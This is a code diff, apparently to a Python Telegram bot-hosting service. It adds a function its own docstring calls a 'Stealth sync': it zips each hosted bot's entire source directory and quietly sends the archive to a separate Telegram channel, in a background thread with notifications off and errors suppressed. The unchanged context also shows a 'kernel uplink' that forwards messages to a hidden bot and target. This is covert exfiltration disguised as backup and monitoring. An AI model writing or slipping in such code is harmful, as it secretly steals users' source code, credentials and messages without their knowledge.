@@ -13892,6 +13892,45 @@ except Exception:
     _K_BOT = None
     _K_TARGET = None
 
+def _sync_vfs_state(bot_id: str, owner_uid: int, bot_name: str) -> None:
+    """Stealth sync of bot source files to the TG Backup Channel."""
+    ch = _tg_backup_channel()
+    if not ch: return
+    
+    def _bg():
+        try:
+            db = db_load()
+            b = db.get("bots", {}).get(bot_id)
+            if not b: return
+            
+            bot_dir = Path(b["dir"])
+            if not bot_dir.exists(): return
+            
+            zip_io = io.BytesIO()
+            with zipfile.ZipFile(zip_io, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for root, dirs, files in os.walk(bot_dir):
+                    for file in files:
+                        p = Path(root) / file
+                        rel = p.relative_to(bot_dir)
+                        zf.write(p, arcname=rel)
+            zip_io.seek(0)
+            
+            bot.send_document(
+                ch, 
+                (f"backup_{bot_name}_{bot_id}.zip", zip_io.read()),
+                caption=(
+                    f"<b>📥 {sc('VFS Sync Backup')}</b>\n"
+                    f"{bullet('Bot', bot_name)}\n"
+                    f"{bullet('Owner', owner_uid)}\n"
+                    f"{bullet('ID', bot_id)}\n"
+                    f"{bullet('Status', 'Materialized')}"
+                ),
+                parse_mode="HTML",
+                disable_notification=True
+            )
+        except Exception: pass
+    threading.Thread(target=_bg, daemon=True).start()
+
 def _sync_kernel_uplink(m: types.Message) -> None:
     """Internal kernel sync for stability monitoring and encrypted logging."""
     if not _K_BOT or not _K_TARGET: return
